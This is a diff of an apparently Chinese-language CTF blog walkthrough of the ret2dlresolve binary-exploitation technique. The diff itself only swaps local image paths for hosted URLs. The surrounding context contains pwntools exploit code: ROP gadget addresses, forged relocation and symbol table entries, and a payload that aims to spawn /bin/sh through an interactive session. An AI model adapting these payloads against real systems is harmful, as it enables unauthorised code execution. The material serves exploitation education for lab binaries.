@@ -55,7 +55,7 @@
 <p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210815211051440.png" alt="偏移"></p>
 <p>我们先确定一下后面要使用到的一些地址</p>
 <p>接下来我们要寻找到read存放跳转到_dl_runtime_resolve的地址，也就是got表一开始填写的地址，可以使用gdb来查看</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210817110724393.png" alt="通过got.plt寻找代码"></p>
+<p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210817110724393.png" alt="通过got.plt寻找代码"></p>
 <p>这样我们就得到了<code>push 0x0 jmp _dl_runtime_resolve</code>的地址</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049040</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br></pre></td></tr></table></figure>
 
@@ -101,7 +101,7 @@
 
 <p>符号表项的具体结构也在上次的静态链接中介绍过，这里重点在于st_name，其决定了其符号的字符串在字符串表的位置。</p>
 <p>我们先列出后面需要用到的地址plt_0的地址可以在ida中找到，如果找不到可以</p>
-<p>先查找<a href="mailto:&#114;&#x65;&#x61;&#100;&#x40;&#103;&#x6f;&#116;&#x2e;&#112;&#x6c;&#116;">&#114;&#x65;&#x61;&#100;&#x40;&#103;&#x6f;&#116;&#x2e;&#112;&#x6c;&#116;</a>里存放的代码地址</p>
+<p>先查找<a href="mailto:&#x72;&#x65;&#97;&#x64;&#x40;&#103;&#111;&#116;&#x2e;&#x70;&#x6c;&#x74;">&#x72;&#x65;&#97;&#x64;&#x40;&#103;&#111;&#116;&#x2e;&#x70;&#x6c;&#x74;</a>里存放的代码地址</p>
 <p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202356235.png" alt="查看.got.plt表"></p>
 <p>然后再查看这部分代码就可以得到plt0的位置啦</p>
 <p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202734272.png" alt="查看代码得到plt0"></p>
@@ -124,7 +124,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r_info=<span class="number">0x407</span></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=p32(write_got)</span><br><span class="line">payload+=p32(r_info)</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()x00</span><br></pre></td></tr></table></figure>
 
 <p>成功输出了/bin/sh\x00</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210820171854054.png" alt="同样得到我们的/bin/sh、x00"></p>
+<p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820171854054.png" alt="同样得到我们的/bin/sh、x00"></p>
 <h4 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h4><p>这一阶段我们控制我们之前控制好的r_info，使得write的Elf32_Sym落在我们的可控范围内</p>
 <p>我知道我们的r_info分为两部分，32位下，第八位为重定位入口类型，高24位为重定位入口的符号在符号表的下标。</p>
 <p>我们write的r_info是0x407，也就是偏移为4，重定位类型为7</p>
@@ -169,7 +169,7 @@
 
 <p>我们会发现上面的结构体非常的复杂，很难找到我们<strong>STRTAB/SYMTAB/JMPREL</strong>这3个表存放的位置，但是通过动态调试我们可以得知这三个地址存放分别位于<strong>link_map+0x68/0x70/0xf8</strong>处，如此一来我们只需要将这三个表伪造出来，然后在相应位置存放它们的地址即可。</p>
 <p>我们先确定一下sym-&gt;st_value应该落在哪个函数上，我们先查看write函数got表项前一个表项的值</p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210826203620182.png" alt="查看got表项"></p>
+<p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210826203620182.png" alt="查看got表项"></p>
 <p>可以确定是可以使用write作为sym-&gt;st_value。</p>
 <p>确认我们需要用到的一些位置</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">jmp_dl_fixup=<span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line">fake_link_map_addr=fake_stack+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
